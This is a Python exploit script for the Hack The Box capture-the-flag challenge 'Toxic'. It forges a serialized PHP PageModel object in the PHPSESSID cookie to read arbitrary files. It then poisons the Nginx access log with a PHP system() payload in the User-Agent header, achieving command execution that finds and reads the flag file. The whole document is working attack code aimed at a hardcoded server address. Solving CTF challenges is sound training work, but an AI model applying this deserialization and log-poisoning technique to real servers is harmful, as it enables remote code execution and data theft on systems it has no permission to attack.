
# Exploit for HTB Challenge Toxic
# Created for RamPanic

import re
import base64
import requests

class Session:
    
    def __init__(self):
        self.request = requests.Session()
    
    @staticmethod
    def setCookieValue(filename):
        objSerialized = "O:9:\"PageModel\":1:{s:4:\"file\";s:" + str(len(filename)) + ":\"" + filename + "\";}"
        return (base64.b64encode(objSerialized.encode())).decode()
    
    @staticmethod
    def getCookie(name, value):
        return { name: value}
        
    @staticmethod
    def setUserAgent(command):
        return { 'User-Agent': f'<?php system(\'{command}\'); ?>' }
        
    def getResponse(self, URL, PORT, cookie, headers=None):
        response = self.request.get(f"http://{URL}:{PORT}", cookies=cookie, headers=headers).text
        return response if response else False

if __name__ == "__main__":

    # CONSTANTES

    URL = "188.166.169.77"
    PORT = 31497
    
    COOKIE_NAME= "PHPSESSID"
    
    # LAUNCH EXPLOIT
    
    print(f"[*] Launching exploit at {URL}:{PORT}...")
    
    session = Session()
 
    # MAIN COOKIE
    
    print(f"[*] Poisoning log of Nginx...")  
  
    cookie_value = Session.setCookieValue("/var/log/nginx/access.log")
    cookie = Session.getCookie(COOKIE_NAME, cookie_value)
	
    print(f"[+] Cookie nginx: {cookie_value}")  
	
    cmd = Session.setUserAgent("ls /flag_*")
    
    response = session.getResponse(URL, PORT, cookie, cmd)
    
    if not response:
    	response = session.getResponse(URL, PORT, cookie, cmd)
    
    print(f"[+] Payload injected in request header")  
    
    # FLAG COOKIE
    flag_path = re.search(r"(/flag_.+)", response).groups()[0]
    
    cookie_value = Session.setCookieValue(flag_path)
    cookie = Session.getCookie(COOKIE_NAME, cookie_value)
    
    print(f"[+] Cookie flag: {cookie_value}")  
    
    flag = (session.getResponse(URL, PORT, cookie)).strip()
    print(f"[+] Request header reinjected")  
    print(f"[+] Flag: {flag}")
